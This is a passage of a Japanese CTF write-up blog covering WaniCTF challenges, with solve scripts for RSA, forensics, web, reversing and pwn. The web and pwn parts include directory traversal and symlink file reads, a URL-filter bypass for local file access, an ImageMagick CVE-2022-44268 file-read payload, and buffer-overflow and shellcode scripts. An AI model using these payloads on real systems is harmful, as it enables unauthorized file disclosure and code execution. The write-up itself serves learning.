+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span><span style="color:#ae81ff">31091873146151684702346697466440613735531637654275447575291598179592628060572504006592135492973043411815280891993199034777719870850799089897168085047048378272819058803065113379019008507510986769455940142811531136852870338791250795366205893855348781371512284111378891370478371411301254489215000780458922500687478483283322613251724695102723186321742517119591901360757969517310504966575430365399690954997486594218980759733095291730584373437650522970915694757258900454543353223174171853107240771137143529755378972874283257666907453865488035224546093536708315002894545985583989999371144395769770808331516837626499129978673</span>
+</span></span><span style="display:flex;"><span>e<span style="color:#f92672">=</span><span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span><span style="color:#ae81ff">8684906481438508573968896111659984335865272165432265041057101157430256966786557751789191602935468100847192376663008622284826181320172683198164506759845864516469802014329598451852239038384416618987741292207766327548154266633297700915040296215377667970132408099403332011754465837054374292852328207923589678536677872566937644721634580238023851454550310188983635594839900790613037364784226067124711011860626624755116537552485825032787844602819348195953433376940798931002512240466327027245293290482539610349984475078766298749218537656506613924572126356742596543967759702604297374075452829941316449560673537151923549844071</span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span><span style="color:#ae81ff">352657755607663100038622776859029499529417617019439696287530095700910959137402713559381875825340037254723667371717152486958935653311880986170756144651263966436545612682410692937049160751729509952242950101025748701560375826993882594934424780117827552101647884709187711590428804826054603956840883672204048820926</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> symbols(<span style="color:#e6db74">&#34;p&#34;</span>)
+</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> symbols(<span style="color:#e6db74">&#34;q&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eq <span style="color:#f92672">=</span> [p<span style="color:#f92672">*</span>q<span style="color:#f92672">-</span>n, p<span style="color:#f92672">+</span>q<span style="color:#f92672">-</span>s]
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> list(nonlinsolve(eq,[p,q]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p,q<span style="color:#f92672">=</span>int(result[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]), int(result[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phi<span style="color:#f92672">=</span>(p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e,phi)
+</span></span><span style="display:flex;"><span>m<span style="color:#f92672">=</span>pow(c,d,n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><h3 id="fusion">fusion</h3>
+<p>マスク <code>mask = int(&quot;55&quot; * 128, 16)</code> が$p, q$ にかけられている．
+このマスクは <code>1010101010...</code> となっているので，$p$ は奇数ビット，$q$ は偶数ビットが
+分かった状態で $r=p+q$ になる．つまり $pq=n, p+q=r$ が分かった状態で渡される．<br>
+このとき例えば下位 $k$ ビットが分かっている状態なら，分かっていない $k+1$ ビットを，
+$1,0$ の二通りを試すことで $k+1$ ビットが分かる．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> gmpy2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">27827431791848080510562137781647062324705519074578573542080709104213290885384138112622589204213039784586739531100900121818773231746353628701496871262808779177634066307811340728596967443136248066021733132197733950698309054408992256119278475934840426097782450035074949407003770020982281271016621089217842433829236239812065860591373247969334485969558679735740571326071758317172261557282013095697983483074361658192130930535327572516432407351968014347094777815311598324897654188279810868213771660240365442631965923595072542164009330360016248531635617943805455233362064406931834698027641363345541747316319322362708173430359</span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">887926220667968890879323993322751057453505329282464121192166661668652988472392200833617263356802400786530829198630338132461040854817240045862231163192066406864853778440878582265466417227185832620254137042793856626244988925048088111119004607890025763414508753895225492623193311559922084796417413460281461365304057774060057555727153509262542834065135887011058656162069317322056106544821682305831737729496650051318517028889255487115139500943568231274002663378391765162497239270806776752479703679390618212766047550742574483461059727193901578391568568448774297557525118817107928003001667639915132073895805521242644001132</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#ae81ff">163104269992791295067767008325597264071947458742400688173529362951284000168497975807685789656545622164680196654779928766806798485048740155505566331845589263626813345997348999250857394231703013905659296268991584448212774337704919390397516784976219511463415022562211148136000912563325229529692182027300627232945</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pq <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mask <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;55&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>pq<span style="color:#f92672">.</span>append(r <span style="color:#f92672">&amp;</span> mask) <span style="color:#75715e"># p(odd)</span>
+</span></span><span style="display:flex;"><span>pq<span style="color:#f92672">.</span>append(r <span style="color:#f92672">&amp;</span> (mask<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">1</span>)) <span style="color:#75715e"># q(even)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>length <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;55&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>bit_length()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    pqOR <span style="color:#f92672">=</span> int(i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    n_mask <span style="color:#f92672">=</span> int(<span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#f92672">*</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    n_masked <span style="color:#f92672">=</span> n <span style="color:#f92672">&amp;</span> n_mask
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (n_masked <span style="color:#f92672">==</span> ((pq[pqOR]<span style="color:#f92672">+</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>i))<span style="color:#f92672">*</span>pq[pqOR<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&amp;</span> n_mask):
+</span></span><span style="display:flex;"><span>        pq[pqOR] <span style="color:#f92672">=</span> pq[pqOR]<span style="color:#f92672">+</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>i)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> pq[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">*</span>pq[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> n
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (pq[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(pq[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>invert(e,phi)
+</span></span><span style="display:flex;"><span>m<span style="color:#f92672">=</span>pow(c,d,n)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><h2 id="forensics">forensics</h2>
+<h3 id="just_mp4">just_mp4</h3>
+<p>与えられた mp4 で <code>exiftool</code> するとフラグが見える</p>
+<h3 id="whats_happning">whats_happning</h3>
+<p><code>foremost</code> すると png が見える</p>
+<h3 id="lowkey_messedup">lowkey_messedup</h3>
+<p>USB パケットの pcap なので USB キーボードだと思う．<a href="https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2">これ</a>を見て復元</p>
+<h3 id="beg_for_a_png">beg_for_a_png</h3>
+<p><code>export object</code> だとうまくいかない．なんでや<br>
+<code>tshark</code> でバイナリを抜き出したらうまくいった</p>
+<h3 id="apocalypse">Apocalypse</h3>
+<p><a href="https://online.officerecovery.com/fr/pixrecovery/">これ</a> を使った．
+本来は IEND を消せばいいらしい．</p>
+<h2 id="web">web</h2>
+<h3 id="indexeddb">indexedDB</h3>
+<p>開発者ツールって書いてあったから見てみたけど何も見えなくて焦った<br>
+index.html にリダイレクトされているのでひとつ前に戻って burp を見るとみつかる．</p>
+<h3 id="extract-service-1">Extract service 1</h3>
+<p>post で word/document.xml が送られている．office ファイルが zip なので中にある
+document.xml が解凍されて送られているということだろうか．
+<code>/flag</code> にフラグがあると分かっているので見るファイルを変える，つまりディレクトリトラバーサル
+<code>../../../flag</code></p>
+<h3 id="64bps">64bps</h3>
+<p><code>dd if=/dev/random of=2gb.txt bs=1M count=2048</code> で2bg.txt に 2048*1M のファイルが付加されている．
+<code>cat flag.txt &gt;&gt; 2gb.txt</code> で2bg.txt の末尾にフラグを入れられている．
+<a href="https://64bps-web.wanictf.org/2gb.txt">https://64bps-web.wanictf.org/2gb.txt</a> にアクセスしてみても一生繋がらない．
+帯域制限がかかっている(64bps)．おもしろい<br>
+<code>range</code> ヘッダを使えば疲労範囲を抽出できる
+(このパラメータは katagaitaiCTF で初めて知った．ありがとう NRI)．
+<code>curl -r 1073741824 https://64bps-web.wanictf.org/2gb.txt</code></p>
+<h3 id="extract-service-2">Extract service 2</h3>
+<p>さっきのディレクトリトラバーサルが対策されている．具体的に <code>docx</code> なら <code>word/document</code>
+みたいに固定されている．じゃあファイルを変えるにはどうするんだろうと思ってシンボリックリンク
+をやってみる．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /flag document.xml
+</span></span><span style="display:flex;"><span>cd ..
+</span></span><span style="display:flex;"><span>7z a solve.zip word
+</span></span></code></pre></div><h3 id="screenshot">screenshot</h3>
+<p><code>url=</code> で指定した URL のスクリーンショットをとってくれるアプリ．
+Dockerfile 的には <code>/flag.txt</code> にフラグが書いてあるっぽい．
+<code>url=file:///flag.txt</code> ってやってみたけどまあ違った．
+クエリの条件があったので見てみる．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;http&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;file&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad Request&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><p><code>http</code> が入っている必要があり，かつ <code>file</code> が入っていたら NG らしい．
+どうしたらいいのか．．．と思って色んな writeup を漁って以下のように解決した</p>
+<ul>
+<li><code>file</code> は <code>FILE</code> とかにすればいい</li>
+<li>クエリパラメータを足して <code>url=FILE:///flag.txt?http=aaa</code></li>
+</ul>
+<h3 id="certified1">certified1</h3>
+<p>画像を送ると別の画像をオーバーレイして返してくれるアプリ．
+以下のような処理がされている</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>.args([
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;-c&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;timeout --signal=KILL 5s magick ./input -resize 640x480 -compose over -gravity southeast ./overlay.png -composite ./output.png&#34;</span>,
+</span></span><span style="display:flex;"><span>        ])
+</span></span></code></pre></div><p>なにしてるんだと思って chatGPT に投げたら ImageMagick を使っているらしい．便利だ<br>
+krenaif さんの動画で ImageMagick の脆弱性についてした覚えがあるので調べてみる．
+Dockerfile を見ると 7.1.0-51 らしい．CVE-2022-44268 ．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">ARG</span> MAGICK_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/ImageMagick/ImageMagick/releases/download/7.1.0-51/ImageMagick--gcc-x86_64.AppImage&#34;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 generate.py -f <span style="color:#e6db74">&#34;flag_A&#34;</span> -o exploit.png
+</span></span><span style="display:flex;"><span>identify -verbose res.png
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;print(bytes.fromhex(&#34;~~~&#34;).decode(&#34;utf-8&#34;))&#39;</span>
+</span></span></code></pre></div><h2 id="rev">rev</h2>
+<h3 id="just_pass">Just_pass</h3>
+<p>strings</p>
+<h3 id="javaering">javaering</h3>
+<p>java-decompiler GUI ．フラグに対して mod 30 でアクセスする部分があったのでこれをバラしてやればいい</p>
+<h3 id="fermat">fermat</h3>
+<p>ghidra で見ると $a^3 + b^3 = c^3$ かを検証する部分があるので gdb で分岐直前で ZF フラグを折ればいい</p>
+<h3 id="theseus">theseus</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x19</span> <span style="color:#f92672">&lt;</span> local_60) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Correct!&#34;</span>);
+</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>LAB_00101478:
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> uVar3;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">compare</span>((<span style="color:#66d9ef">int</span>)local_48[local_60],local_60);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Incorrect.&#34;</span>);
+</span></span><span style="display:flex;"><span>      uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LAB_00101478;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    local_60 <span style="color:#f92672">=</span> local_60 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
+</span></span></code></pre></div><p>ここで見るべきなのは <code>iVar2 = compare((int)local_48[local_60],local_60);</code> で，
+これを常に(0x19 回)正解し続ければいい．
+<code>compare</code> 関数を見てみると</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> param_1 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_38 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)param_2);
+</span></span></code></pre></div><p>ここで入力の <code>param_1</code> と比較用パスワード <code>local_38 + index(param_2)</code> を比較しているので
+<code>local_38</code> を見ればいい．</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b *0x555555555245
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>------------------------------------stack-------------------------------------<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0000| 0x7fffffffdd10 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;esktop/w&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0008| 0x7fffffffdd18 --&gt; 0x722f463100000000 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0016| 0x7fffffffdd20 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;FLAG{vKCsq3jl4j_Y0uMade1t}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0024| 0x7fffffffdd28 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sq3jl4j_Y0uMade1t}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0032| 0x7fffffffdd30 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Y0uMade1t}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0040| 0x7fffffffdd38 --&gt; 0x7d74 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;t}&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0048| 0x7fffffffdd40 --&gt; 0x4746524f4c2d4300 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>0056| 0x7fffffffdd48 --&gt; 0xb9324754ed0d9100 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>------------------------------------------------------------------------------<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="web_assembly">web_assembly</h3>
+<p>開発者ツールで index.wasm を見たらそれっぽい羅列があったので入れたら通った．
+どうするのが正解だったんだろう</p>
+<h2 id="pwn">pwn</h2>
+<h3 id="01netcat">01.netcat</h3>
+<p><code>nc netcat-pwn.wanictf.org 9001</code> やるだけ</p>
+<h3 id="02only_once">02.only_once</h3>
+<p>問題数が足りなくてシェルが得られない．9文字以上入れると
+<code>chall</code> を壊せるので問題数を増やせる</p>
+<h3 id="03ret2win">03.ret2win</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;chall&#39;</span>)
+</span></span><span style="display:flex;"><span>server<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;ret2win-pwn.wanictf.org&#39;</span>)
+</span></span><span style="display:flex;"><span>port<span style="color:#f92672">=</span>(<span style="color:#ae81ff">9003</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> remote(server,port) <span style="color:#66d9ef">as</span> r:
+</span></span><span style="display:flex;"><span>        payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        payload<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span>
+</span></span><span style="display:flex;"><span>        payload<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x401369</span>)
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="04shellcode_basic">04.shellcode_basic</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;ret2win-pwn.wanictf.org&#39;</span>, <span style="color:#ae81ff">9004</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>sendline(asm(shellcraft<span style="color:#f92672">.</span>sh()))
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>文章はここで途切れている</p>
+
+    </div>
+    <div class="post-footer">
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css" integrity="sha384-dbVIfZGuN1Yq7/1Ocstc1lUEm+AT+/rCkibIcC/OmWo5f0EA48Vf8CytHzGrSwbQ" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js" integrity="sha384-2BKqo+exmr9su6dir+qCw08N2ZKRucY4PrGQPPWU1A7FtlCGjmEGFqXCv5nyM5Ij" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false}]
+    });
+  });
+</script>
+      
+    </div>
+  </article>
+  <hr>
+  <p>© side-realms All rights reserved.</p>
+
+    </main>
+  </body>
+</html>
